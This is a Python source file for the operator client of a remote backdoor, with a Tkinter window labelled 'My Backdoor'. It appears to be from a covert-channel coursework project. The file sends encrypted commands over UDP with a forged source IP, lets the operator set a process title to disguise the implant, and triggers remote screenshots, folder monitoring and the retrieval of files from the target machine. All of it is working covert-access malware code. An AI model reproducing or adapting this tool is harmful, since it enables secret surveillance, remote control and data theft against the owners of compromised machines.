#!/usr/bin/python3


import argparse
import logging
import binascii
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from binascii import hexlify, unhexlify
import setproctitle
import sys
from tkinter import *
from tkinter import ttk
import tkinter as tk

import threading
import multiprocessing
from multiprocessing import Process
import time

#from Crypto.Util.Padding import pad

import crypto


fileProcess = ''
    



def sendData(dstIp, data, title, sourceIp):
    global startAES
    startAES = 0
    global startRSA
    startRSA = 0
    global startYiao
    startYiao = 0
    key = 8
    info = title +"\"" + data
    print(info)
    print (var.get())
    encryptedText2 = b''
    if var.get() == 1:
        print("We want AES encryption!")
        startAES = time.time()
        encryptedText2 = crypto.aesEncrypt(info.encode("utf8"))
        print(encryptedText2)
        decryptedText2 = crypto.aesDecrypt(encryptedText2)
        print(decryptedText2)


    elif var.get() == 2:
        startRSA = time.time()
        print("We are doing RSA Encryption!")
        encryptedText2 = crypto.RSAEncrypt(info)
        print(encryptedText2)
        print("Encrypted above")

        #decrypted22= encryptedText2[:-1]
        #rsaDecrypt = crypto.RSADecrypt(decrypted22)
        #print(rsaDecrypt)
        #print("Decrypted above")


    elif var.get() == 3:
        print("We are doing Yiao's Encryption!")
        startYiao = time.time()
        encryptedText = crypto.encryptData(info)
        print(encryptedText)
        print("Encrypted text")
        encrypted = crypto.encryptData2(key, encryptedText)
        print(encrypted)

        print("Encrypted text again")

        byteArray = bytearray(encrypted)
        byteArray.append(9)
        encryptedText2 = bytes(byteArray)
        print(encryptedText2)

    else:
        print("We want AES encryption!")
        encryptedText2 = crypto.aesEncrypt(info.encode("utf8"))
        print(encryptedText2)

        #decryptedText2 = crypto.aesDecrypt(key, encryptedText2)
        #print(decryptedText2)
        



    pkt = IP(src=sourceIp, dst=dstIp)/UDP(dport=8000, sport=8505)/encryptedText2    
    send(pkt, verbose=0)
    print("Sent packet 1")


def sendDataWatch(dstIp, data, title, sourceIp):
    info = title +"\"" + data
    ciphertext = hexlify(info.encode("utf-8"))
    aesCipherText = crypto.aesEncrypt(ciphertext)
    pkt = IP(src=sourceIp, dst=dstIp)/UDP(dport=8006, sport=8506)/aesCipherText
    send(pkt, verbose=0)
    print(aesCipherText)
    print("Packet sent 2")

def sendNotice(dstIp, data, sourceIp):
    text = hexlify(data.encode("utf-8"))
    pkt = IP(src=sourceIp, dst=dstIp)/UDP(dport=5500, sport=5506)/text
    send(pkt, verbose=0)
    print("Sent sendrecv")

def screeny():
    data = "screenshot"
    dstIp = destinationip.get()
    sip = sourceip.get()
    text = hexlify(data.encode("utf-8"))
    pkt = IP(src=sip, dst=dstIp)/UDP(dport=7700, sport=7706)/text
    send(pkt, verbose = 0)
    print("Sent screeny command")

def main():

    print("Client Started!")
    root = Tk() 
    root.geometry("550x550+300+300")
    root.title("My Backdoor")
    root.configure(background="#87CEFA")

    global destinationip
    global processtitle
    global command
    global sourceip
    global results
    
    menubar = Menu(root)
    menubar.configure(background = "#FFA500")

    filemenu = Menu(menubar, tearoff=0)
    filemenu.add_command(label="Screenshot", command = screeny)
    filemenu.add_command(label = "Help", command = lambda:popupmsg())
    menubar.add_cascade(label = "File", menu=filemenu)

    
    menubar.add_command(label="Exit", command = root.destroy)

    root.config(menu = menubar)

    lTitle = Label(root, text = "Welcome to My Backdoor", width = 30, fg="#0000FF")
    lTitle.config(font=("TkHeadingFont", 18, "italic", "underline", "bold"), background = "#87CEFA")
    lTitle.grid(column = 0, row = 0, columnspan = 2, rowspan = 2, padx = 5, pady = 8)

    destinationip = StringVar()
    processtitle = StringVar()
    command = StringVar()
    sourceip = StringVar()
    results = StringVar()   
    results.set("Results will appear here")



#Commands
    lDestIP = Label(root, text = "Destination IP", width = 20, fg="purple")
    lDestIP.config(font=("OPEN SANS", 10, "italic", "bold"))
    lDestIP.configure(background = "#1E90FF")
    lDestIP.grid(column = 0, row = 3)
    eDestIP = Entry(root, textvariable = destinationip, bg='green', width = 30)
    eDestIP.grid(column = 1, row = 3, padx = 12, pady = 10, ipady = 3)


    lSourceIP = Label(root, text = "Source IP", fg="purple")
    lSourceIP.config(font=("OPEN SANS", 10, "italic", "bold"))
    lSourceIP.configure(background = "#1E90FF")
    lSourceIP.grid(column = 0, row = 4)
    eSourceIP = Entry(root, textvariable = sourceip, bg='green', width = 30)
    eSourceIP.grid(column = 1, row = 4, pady = 8, ipady = 3)

    lProcessTitle = Label(root, text = "Process Title", fg="purple")
    lProcessTitle.config(font=("OPEN SANS", 10, "italic", "bold"))
    lProcessTitle.configure(background = "#1E90FF")
    lProcessTitle.grid(column = 0, row = 6)
    mProcessTitle = Entry(root, textvariable = processtitle, bg='green', width = 30)
    mProcessTitle.grid(column = 1, row = 6, pady = 8, ipady = 3)


    lCommand = Label(root, text = "Your commands to send", fg="purple")
    lCommand.config(font=("OPEN SANS", 10, "italic", "bold"))
    lCommand.configure(background = "#1E90FF")
    lCommand.grid(column = 0, row = 8, padx = 8)
    eCommand = Entry(root, textvariable = command, bg='green', width = 30)
    eCommand.grid(column = 1, row = 8, pady = 8, ipady = 3)

#Encryption buttons
    global var
    var = IntVar()
    aesRadioButton = tk.Radiobutton(root, text = "AES", variable = var, value = 1, background = "#1E90FF", activebackground = "yellow", activeforeground = "green")
    aesRadioButton.grid(column = 1, row = 10, columnspan = 1, pady = 1)

    rsaButton = IntVar()
    rsaRadioButton = tk.Radiobutton(root, text = "RSA", variable = var, value = 2, background = "#1E90FF", activebackground = "yellow", activeforeground = "green")
    rsaRadioButton.grid(column = 1, row = 11, columnspan = 1, pady = 1)


    yiaoButton = IntVar()
    yiaoRadioButton = tk.Radiobutton(root, text = "Yiao's Encryption", variable = var, value = 3, background = "#1E90FF", activebackground = "yellow", activeforeground = "green")
    yiaoRadioButton.grid(column = 1, row = 12, columnspan = 1, pady = 1)

    b = tk.Button(root, text="Send Command!", command=parse, width = 30, background = "#1E90FF", activebackground = "yellow", activeforeground = "green", font = ("bold"))
    b.grid(column = 1, row = 14, pady = 2, ipady = 2, columnspan = 1)

#Result of commands

    lResults = tk.Label(root, textvariable = results, fg = "#DC143C", bg = "#87CEFA")
    lResults.config(font=("OPEN SANS", 10, "bold"))
    lResults.grid(column = 1, row = 15, pady = 3, ipady = 2, columnspan = 1)

    global timeOfResults
    timeOfResults = StringVar()
    timeOfResults.set("Time of completion")

    lResultsTime = tk.Label(root, textvariable = timeOfResults, fg = "#CD5C5C", bg = "#87CEFA")
    lResultsTime.config(font = ("OPEN SANS", 8, "italic"))
    lResultsTime.grid(column = 1, row = 16, columnspan = 1)

#Watch files

    global watchfile
    

    watchfile = StringVar()

    global resultsWatch
    resultsWatch = StringVar()
    resultsWatch.set("Changes will be notified below: ")

    global filechanges
    filechanges = StringVar()
    filechanges.set("")

    eEntryWatch = Entry(root, textvariable = watchfile, bg='green', width = 30)
    eEntryWatch.grid(column = 1, row = 17, padx = 12, pady = 10, ipady = 3, columnspan = 1)


    labelWatch = Label(root, text = "Watch Folder Name:", width = 20, fg = "purple")
    labelWatch.grid (column = 0, row = 17, pady = 3, ipady = 3, columnspan = 1)
    labelWatch.config(font=("OPEN SANS", 10, "italic", "bold"))
    labelWatch.configure(background = "#1E90FF")

    watchButton = tk.Button(root, text = "Watch for Changes!", command = parseWatch, background = "#1E90FF", activebackground = "yellow", activeforeground = "green")
    watchButton.grid(column = 1, row = 18, pady = 3, ipady = 3, columnspan = 1)

    lResultsWatch = tk.Label(root, textvariable = resultsWatch, fg = "yellow", bg = "#1E90FF")
    lResultsWatch.config(font=("OPEN SANS", 10, "bold"))
    lResultsWatch.grid(column = 1, row = 20, columnspan = 1)

    

    lFilechanges = Label(root, textvariable = filechanges, fg = "#DC143C", bg = "#87CEFA")
    lFilechanges.config(font=("OPEN SANS", 10, "bold"))
    lFilechanges.grid(column = 1, row = 22, columnspan = 1)

    print(lResults, b)


    ###Receive File
    global logfile
    logfile = StringVar()

    labelLogFile = Label(root, text = "File Name to Retrieve: ", width = 20, fg = "purple")
    labelLogFile.grid (column = 0, row = 24, pady = 3, ipady = 3, columnspan = 1)
    labelLogFile.config(font = ("OPEN SANS", 10, "italic", "bold"))
    labelLogFile.configure(backgroun = "#1E90FF")
    eLogFile = Entry(root, textvariable = logfile, bg='green')
    eLogFile.grid(column = 1, row = 24, pady = 3, ipady = 3, columnspan = 1)

    retrieveFileButton = tk.Button(root, text = "Get File", command = sendRecv, background = "#1E90FF", activebackground = "yellow", activeforeground = "green")
    retrieveFileButton.grid(column = 1, row = 26, pady = 3, ipady = 3, columnspan = 1)

    global completionNotifier
    completionNotifier = StringVar()
    completionNotifier.set("")
    lFileNotifier = Label(root, textvariable = completionNotifier, fg = "#DC143C", bg = "#87CEFA")
    lFileNotifier.config(font=("OPEN SANS", 10, "bold"))
    lFileNotifier.grid(column = 1, row = 28, columnspan = 1)
    root.mainloop()

def popupmsg():
    msg = "Please refer to the help guide for all the information you need!"
    popup = tk.Tk()
    popup.configure(bg = "#00FFFF")
    popup.wm_title("Help!")
    label = tk.Label(popup, text = msg, font = ("Verdana", 12), bg = "#00FFFF", fg = "blue")
    label.pack(side = "top", fill = "x", pady = 10)
    button1 = tk.Button(popup, text = "Okay", command = popup.destroy, bg = "#ADD8E6", activebackground = "yellow")
    button1.pack(pady = 5)
    popup.mainloop()


def parseWatch():
    resultsWatch.set("Watching...")
    p = Process(target = watchs, args="")
    if p.is_alive():
        p.terminate()
    p.start()

def watchs():
    print("Monitor..")
    watchFile = watchfile.get()
    destIP = destinationip.get()
    processTitle = processtitle.get()
    sourceIP = sourceip.get()

    sendDataWatch(destIP, watchFile, processTitle, sourceIP)
    sniff(filter="udp and dst port 8506 and src port 8006", prn=readWatch, count=1)


def readWatch(pkt):
    print("Read from watch")
    if ARP not in pkt:
        data = pkt[Raw].load
        aesDecryptWatch = crypto.aesDecrypt(data)
        watchMessage = binascii.unhexlify(aesDecryptWatch)              

        print (watchMessage)
        
    time.sleep(1)
    print("changing file changes notice")
    watchMessageChange = watchMessage.strip()

    resultsWatch.set(watchMessageChange)


    return watchMessage


def parse():

    global destIP
    destIP = destinationip.get()
    print (destIP)
    processTitle = processtitle.get()
    newCommand = command.get()
    sourceIP = sourceip.get()

    
    sendData(destIP, newCommand, processTitle, sourceIP)
    print(destIP)
    if command == ("quit"):
        exit()
    sniff(filter="udp and dst port 8505 and src port 8000", prn=readPacket, count=1)

def readPacket(pkt):

    if ARP not in pkt:
        data = pkt["Raw"].load
        decryptedMessage = crypto.aesDecrypt(data)
        message = binascii.unhexlify(decryptedMessage)
        decoded = message.decode("utf-8")   
                  

        print (decoded)

    results.set(decoded)
    end = time.time()
    if var.get() == 1:
        aesTime = (end-startAES)
        print (end-startAES)
        timeOfResults.set(str("%.4f" % aesTime) + " seconds")

    elif var.get()==2:
        rsaTime = (end - startRSA)
        print (end-startRSA)
        timeOfResults.set(str("%.4f" % rsaTime) + " seconds")

    elif var.get()==3:
        yiaoTime = (end-startYiao)
        print(end-startYiao)
        
        timeOfResults.set(str("%.4f" % yiaoTime) + " seconds")



    return

def watching(pkt):
    print("Received watch")
    data = pkt[Raw].load
    print(data)
    decryptWatchingPkt = crypto.aesDecrypt(data)
    watchdec = binascii.unhexlify(decryptWatchingPkt)
    print (watchdec)
    watchres = watchdec.strip()

    print(watchres)

    filechanges.set(watchres)

    return


def sniffing():
    sniff(filter="udp and dst port 8504 and src port 8004", prn=watching)

def sendRecv():
    fileGrabbed = logfile.get()
    if fileGrabbed == "":
        print("No file to grab")
        completionNotifier.set("Enter a file")
        return
    ip = destinationip.get()
    sip = sourceip.get()
    print(ip)
    print(sip)
    data = fileGrabbed
    sendNotice(ip, data, sip)
    time.sleep(0.5)
    processRecv(ip)

def processRecv(destip):
    s = socket.socket()     
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)        # Create a socket object
    
    host = destip # Get local machine name 
    port = 60000                  # Reserve a port for your service.
    fileName = logfile.get() + "1"

    s.connect((host, port))
    s.send("Connected from client!".encode('utf-8'))


    
    with open(fileName, 'wb') as f:
        print ('file opened')
        while True:
            print('receiving data...')
            data = s.recv(1024)
            print(data)
            aesDecryptFileData = crypto.aesDecryptFileSending(data)
            if not data:
                break
            
            print('data=%s', (aesDecryptFileData))
            f.write(aesDecryptFileData)

    f.close()

    checkFile = open(fileName, 'rb')
    read = checkFile.read(1024)
    if not read:
        print("No data in file: No such file")
        completionNotifier.set("No such file")
        return
    
    print('Successfully received file')
    s.close()
    print('Connection closed')
    completionNotifier.set("Transfer Completed!")

if __name__ == '__main__':


    try:
        t1 = threading.Thread(target=main, args=[])
        t2 = threading.Thread(target=sniffing, args=[])
        t1.start()
        t2.start()
    except KeyboardInterrupt:
        print ('Exiting..')

